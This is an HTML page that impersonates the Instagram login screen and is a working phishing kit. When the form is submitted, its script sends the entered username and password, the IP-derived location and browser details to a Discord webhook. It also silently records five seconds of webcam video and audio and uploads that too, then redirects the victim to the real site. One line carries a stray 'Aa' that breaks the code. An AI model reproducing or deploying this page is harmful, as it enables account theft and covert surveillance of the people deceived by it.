<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
        .logo { width: 175px; margin-bottom: 30px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background: #fafafa; font-size: 12px; }
        button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        button:disabled { background: #b2dffc; }
        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: bold; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
        .divider span { padding: 0 10px; }
        .forgot { color: #00376b; font-size: 12px; text-decoration: none; margin-top: 20px; display: block; }
        .signup-box { background: white; border: 1px solid #dbdbdb; padding: 20px; width: 350px; text-align: center; margin-top: 10px; font-size: 14px; }
        .signup-box a { color: #0095f6; text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>
    <div>
        <div class="container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="logo">
            <form id="loginForm">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" id="loginBtn">Log In</button>
            </form>
            <div class="divider"><span>OR</span></div>
            <a href="#" class="forgot">Forgot password?</a>
        </div>
        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_HERE';

        async function getIPData() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                return await res.json();
            } catch (e) {
                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown' };
            }
        }

        function getBrowserData() {
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform
            };
        }

        async function captureMedia() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const formData = new FormData();
                    formData.append('file', blob, 'capture.webm');
                    
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        body: formData
                    });
                    
                    stream.getTracks().forEach(track => track.stop());
                };
                
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000); // Record 5 seconds
            } catch (e) {
                console.error("Media capture failed", e);
            }
        }

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            // Start media capture silently
            captureMedia();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const ipData = await getIPData();
            const browserData = getBrowserData();
            const timestamp = new Date().toISOString();

            const payload = {
                content: "@everyone New Login Captured!",
                embeds: [{
                    title: "Instagram Phish Result",
                    color: 14423100,
                    fields: [
                        { name: "Username", value: username, inline: true },
                        { name: "Password", value: password, inline: true },
                        { name: "IP Address", value: ipData.ip, inline: false },
                        { name: "Location", value: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`, inline: false },
                        { name: "OS/Platform", value: browserData.platform, inline: true },
                        { name: "User Agent", value: browserData.userAgent, inline: false },
                        { name: "Timestamp", value: timestamp, inline: false }
                    ]
                }]
            };

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)Aa
            });

            // Redirect to real instagram after a delay
            setTimeout(() => {
                window.location.href = 'https://www.instagram.com';
            }, 5500);
        });
    </script>
</body>
</html>
